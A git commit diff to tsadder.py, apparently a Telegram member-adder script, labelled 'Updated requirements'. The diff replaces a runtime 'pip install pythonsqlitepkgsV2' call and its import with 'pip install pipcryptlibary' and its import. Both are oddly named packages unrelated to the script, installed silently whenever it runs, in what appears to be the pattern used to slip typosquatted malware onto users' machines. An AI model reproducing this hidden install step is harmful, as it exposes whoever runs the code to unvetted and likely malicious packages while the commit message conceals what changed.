1e98a7e637158b8febce97bdb975ae8b5e433025
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-08 23:15:12 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitepkgsV2")
-import pythonsqlitepkgsV2
+os.system("pip install pipcryptlibary")
+import pipcryptlibary
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
